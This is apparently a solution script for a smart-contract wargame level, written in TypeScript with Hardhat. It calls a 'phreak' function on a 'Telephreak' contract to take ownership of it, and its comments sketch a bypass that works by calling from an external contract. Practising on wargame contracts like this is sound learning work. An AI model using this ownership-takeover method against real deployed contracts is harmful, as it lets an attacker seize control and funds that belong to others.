import { ethers } from "hardhat"
import { LEVEL_ADDRESSES, ADDRESSES } from "../consts"
//claim ownership of contract
//call change owner with a twist // must call from external
//???
//profit

async function pwn() {
    const signer = (await ethers.getSigners())[0]
    const contract = await ethers.getContractAt("Telephreak", ADDRESSES.telephreak)
    console.log("supa freak, shes supa freaky...")
    const call = await contract.phreak()
    const receipt = await call.wait()
    console.log("☎️☎️☎️☎️☎️☎️ pwned ☎️☎️☎️☎️☎️☎️☎️")
}

pwn()